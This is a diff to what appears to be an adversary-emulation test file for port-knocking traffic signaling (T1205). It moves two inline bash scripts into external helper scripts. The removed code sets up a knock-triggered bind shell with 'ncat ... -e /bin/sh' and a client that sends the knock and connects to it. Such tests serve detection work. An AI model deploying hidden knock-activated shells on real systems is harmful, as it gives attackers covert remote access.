@@ -19,7 +19,7 @@ atomic_tests:
       description: CSV of UDP ports that define a knock
       type: String
       default: "40000,41000,40000,42000,40000,43000"
-    listening_port:
+    server_listening_port:
       description: Port to start listening on after knock
       type: String
       default: "54321"
@@ -43,59 +43,7 @@ atomic_tests:
   executor:
     name: bash
     elevation_required: false
-    command: |
-      TSHARK_FILTER=""
-      GREP_PATTERN=""
-      if [ "#{knock_protocol}" = "tcp" ] ; then
-        PROTOCOL="tcp"
-      else
-        PROTOCOL="udp"
-      fi
-
-      for PORT in $(echo "#{knock_port_sequence}" | sed "s/,/ /g")
-      do
-        if [ -z "$TSHARK_FILTER" ] ; then
-          TSHARK_FILTER="($PROTOCOL dst port $PORT)"
-          GREP_PATTERN="'$PORT'"
-        else
-          TSHARK_FILTER="$TSHARK_FILTER or ($PROTOCOL dst port $PORT)"
-          GREP_PATTERN="$GREP_PATTERN(.*\n)*'$PORT'"
-        fi
-      done
-      TSHARK_FILTER="($TSHARK_FILTER) and inbound"
-
-      echo "Listen for sequence for #{max_listen_seconds} seconds"
-      sudo tshark -Q -l -n -f "$TSHARK_FILTER" -T fields -E quote=s -e $PROTOCOL.dstport -a duration:#{max_listen_seconds} > /tmp/t1205_server.dat 2> /dev/null & TSHARK_PID=$!
-
-      SEQUENCE_FOUND=0
-      COUNTER=0
-      while [ $COUNTER -lt #{max_listen_seconds} ] ; do
-        echo "debug1"
-        grep -qPoz  "$GREP_PATTERN" /tmp/t1205_server.dat 2>&1 /dev/null
-        if [ $? -eq 0 ] ; then
-          echo "Sequence found..."
-          SEQUENCE_FOUND=1
-          kill $TSHARK_PID
-          break
-        fi
-        if [ $(( $COUNTER % 5 )) -eq 0 ] ; then
-            echo "We have been listening for COUNTER seconds out of max #{max_listen_seconds} seconds"
-        fi
-        echo "Counter: $COUNTER"
-        COUNTER=$((COUNTER+1))
-        echo "debug2"
-        sleep 1s
-        echo "debug3"
-        echo "Counter: $COUNTER"
-      done
-
-      echo "Seq: $SEQUENCE_FOUND"
-      if [ $SEQUENCE_FOUND -eq 1 ] ; then
-        echo "Start shell server; listen for up to #{max_listen_seconds} seconds."
-        timeout #{max_listen_seconds}s ncat -nlp #{listening_port} -e /bin/sh
-      else
-        echo "Sequence not heard..."
-      fi
+    command: ./bin/bind_shell_server.sh "#{knock_protocol}" "#{knock_port_sequence}" "#{server_listening_port}" "#{max_listen_seconds}"
     cleanup_command:
       rm -f /tmp/t1205_server.dat
 
@@ -133,37 +81,6 @@ atomic_tests:
   executor:
     name: bash
     elevation_required: false
-    command: |
-      SHELL_CONTACTED=0
-      for LOOP in {1..5} ;
-      do
-        for PORT in $(echo "#{knock_port_sequence}" | sed "s/,/ /g")
-        do
-          if [ "#{knock_protocol}" = "udp" ] ; then
-            echo "Knock" | ncat -u -w 1s #{server_ip} $PORT
-          else
-            echo "Knock" | ncat -w 1s #{server_ip} $PORT
-          fi
-          echo "Knock $PORT"
-          sleep 0.5s
-        done
-        echo "Anyone home?  Knock $LOOP of max 5."
-
-        sleep 2s
-        echo 'echo Shell to host $HOSTNAME as user $USER successful.'  && sleep 1 | ncat #{server_ip} #{listening_port} > /tmp/t1205_client.dat 2> /dev/null
-        if [ -s /tmp/t1205_client.dat ] ; then
-          SHELL_CONTACTED=1
-          break
-        else
-          echo "Shell not there yet..."
-        fi
-      done
-
-      if [ $SHELL_CONTACTED -ne 0 ] ; then
-        echo Shell successfully executed with port knock
-        cat /tmp/t1205_client.dat
-      else
-        echo Unable to bind shell with port knock
-      fi
+    command: ./bin/bind_shell_client.sh "#{server_ip}" "#{knock_protocol}" "#{knock_port_sequence}" "#{listening_port}"
     cleanup_command:
       rm -f /tmp/t1205_client.dat
